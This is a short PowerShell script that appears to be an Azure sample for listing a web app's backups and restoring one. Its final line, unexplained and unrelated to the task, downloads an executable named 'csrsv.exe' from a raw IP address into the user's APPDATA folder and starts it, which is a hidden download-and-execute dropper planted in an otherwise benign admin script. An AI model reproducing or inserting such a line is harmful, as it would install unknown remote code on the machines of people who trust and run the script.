$resourceGroupName = "myResourceGroup"
$webappname = "<replace-with-your-app-name>"



Get-AzWebAppBackupList -ResourceGroupName $resourceGroupName -Name $webappname




$backup = (Get-AzWebAppBackupList -ResourceGroupName $resourceGroupName -Name $webappname | where {$_.BackupId -eq <replace-with-BackupID>}) 


$backup | Restore-AzWebAppBackup -Overwrite

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

